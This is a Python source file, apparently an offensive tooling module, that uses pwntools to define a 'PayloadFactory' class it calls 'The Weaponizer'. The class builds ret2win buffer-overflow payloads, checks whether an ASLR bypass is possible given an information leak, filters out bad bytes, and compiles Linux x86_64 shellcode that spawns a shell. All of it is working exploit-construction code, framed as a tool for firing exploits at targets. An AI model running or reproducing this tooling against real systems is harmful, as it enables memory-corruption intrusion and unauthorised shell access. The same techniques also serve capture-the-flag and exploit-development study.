from pwn import *
import os

class PayloadFactory:
    """
    The Weaponizer.
    Constructs binary payloads (ROP chains, Shellcode, Overflows).
    """
    def __init__(self, arch="amd64", os="linux"):
        context.arch = arch
        context.os = os
        context.bits = 64
        context.log_level = 'error' 
    def check_aslr_requirements(self, aslr_enabled: bool, has_info_leak: bool) -> bool:
        """
        HARDENING: ASLR/DEP Awareness.
        Prevents firing dumb exploits at hardened targets.
        """
        if not aslr_enabled:
            return True # Safe to fire
            
        if aslr_enabled and not has_info_leak:
            print("[FACTORY] ❌ ABORT: Target has ASLR but no Information Leak provided.")
            print("          Cannot calculate Return Address.")
            return False
            
        if aslr_enabled and has_info_leak:
            print("[FACTORY] ✅ ASLR Bypass: Adjusting offsets using Information Leak...")
            return True
            
        return False    

    def _check_bad_chars(self, payload: bytes, bad_chars: bytes = b'\x00') -> bool:
        """
        HARDENING: Verify payload doesn't contain forbidden bytes.
        This prevents exploits from breaking due to string termination.
        """
        for bad in bad_chars:
            if bad in payload:
                print(f"[FACTORY] ⚠️  CRITICAL: Payload contains bad char: {hex(bad)}")
                return False
        return True

    def generate_buffer_overflow(self, offset: int, target_address: int) -> bytes:
        """
        Type: Ret2Win (Return to Function)
        """
        print(f"[FACTORY] Assembling payload...")
        print(f"    - Padding: {offset} bytes")
        print(f"    - Target RIP: {hex(target_address)}")
        
        # 1. The Padding
        payload = b"A" * offset
        
        # 2. The Return Address
        payload += p64(target_address)
        
        # 3. HARDENING CHECK
        if not self._check_bad_chars(payload):
            print("[FACTORY] Warning: Payload contains bad characters.")
        
        return payload

    def generate_shellcode(self) -> bytes:
        """Generates raw machine code to spawn a shell."""
        print("[FACTORY] Compiling shellcode for Linux/x86_64...")
        return asm(shellcraft.sh())